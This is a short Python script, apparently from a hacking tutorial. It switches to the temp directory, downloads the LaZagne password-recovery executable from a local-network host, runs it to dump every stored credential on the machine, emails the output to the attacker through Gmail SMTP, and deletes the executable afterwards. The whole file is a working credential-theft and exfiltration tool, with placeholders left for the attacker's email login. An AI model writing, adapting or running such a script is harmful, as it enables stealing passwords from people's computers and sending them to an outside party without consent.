from unittest import result
import requests #library request to the server
import smtplib                                        #http://192.168.1.184/ss.html
import subprocess
import os, tempfile
def download_files(url):
    getRes = requests.get(url) #request to the perticular server and download the filess
    filename = url.split("/")[-1]
    with open(filename,"wb") as f: #wb write binary mode 
        f.write(getRes.content);
        f.close()
def sendmail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download_files("http://192.168.1.184/lazagne.exe") # add direct link for the lazagne
result = subprocess.check_output("lazagne.exe all",shell=True).decode("utf-8","ignore")
sendmail("YOUR_EMAIL_HERE","YOUR_PASSWROD_HERE",result)
os.remove("lazagne.exe")